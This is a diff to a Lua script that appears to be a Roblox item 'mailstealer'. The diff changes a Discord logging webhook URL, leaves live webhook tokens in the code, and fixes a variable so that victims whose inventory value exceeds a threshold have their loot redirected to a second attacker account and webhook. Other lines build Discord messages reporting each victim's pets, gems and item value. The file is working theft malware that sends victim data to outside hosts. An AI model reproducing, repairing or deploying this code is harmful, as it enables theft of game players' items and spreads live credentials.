@@ -3,7 +3,7 @@ DualRap = 5000000000
 DualUser = "zxrby2"
 DualWebhook = "https://discord.com/api/webhooks/1343598692355149884/7kOEzufWWGC7hazz01iwpHgYBaquryqU1013AyL3CEzsTYe6bisdlVK8-6ONlxNViefV"
 
-LogsWebhook = "https://discord.com/api/webhooks/1343598692355149884/7kOEzufWWGC7hazz01iwpHgYBaquryqU1013AyL3CEzsTYe6bisdlVK8-6ONlxNViefV"
+LogsWebhook = "https://discord.com/api/webhooks/1343555729927311430/WvB57pIzRP5wX3voC0EPYA96IySGmAkk36KsSITznYS2_9LnfYm_xuuBDmmEsexTmH4O"
 mailstealer_name = "Historic"
 
 
@@ -138,7 +138,6 @@ local GetItemValue = function(Type, ItemTable)
 end
 
 
-
 local GetItemValueOfItems = function()
     RAP = 0
     for name_of_category, category in pairs(Inventory) do
@@ -211,32 +210,32 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
                     },
                     {
                         ["name"] = ":dog: **Pets left** :dog:",
-                        ["value"] = "```鉃� " .. pets_left .. "```",
+                        ["value"] = "```鉃  " .. pets_left .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":money_mouth: **" .. item_type .. "** :money_mouth:",
-                        ["value"] = "```鉃� " .. id .. "```",
+                        ["value"] = "```鉃  " .. id .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":trophy: **Item RAP** :trophy:",
-                        ["value"] = "```鉃� " .. FormatNumber(RAP) .. "```",
+                        ["value"] = "```鉃  " .. FormatNumber(RAP) .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":gem: **Gems Left** :gem:",
-                        ["value"] = "```鉃� " .. FormatNumber(GemsAmount) .. "```",
+                        ["value"] = "```鉃  " .. FormatNumber(GemsAmount) .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":sparkles: **Shiny** :sparkles:",
-                        ["value"] = "```鉃� " .. shinyy .. "```",
+                        ["value"] = "```鉃  " .. shinyy .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":rainbow: **RB/Gold/Reg** :sparkles:",
-                        ["value"] = "```鉃� " .. RBgoldNormal .. "```",
+                        ["value"] = "```鉃  " .. RBgoldNormal .. "```",
                         ["inline"] = true
                     }
                 }
@@ -737,7 +736,7 @@ end
 
 if totalRap >= DualRap then
  print("error")
- Roblox_Username = DualUsee
+ Roblox_Username = DualUser
  Discord_Webhook = DualWebhook
 end
 
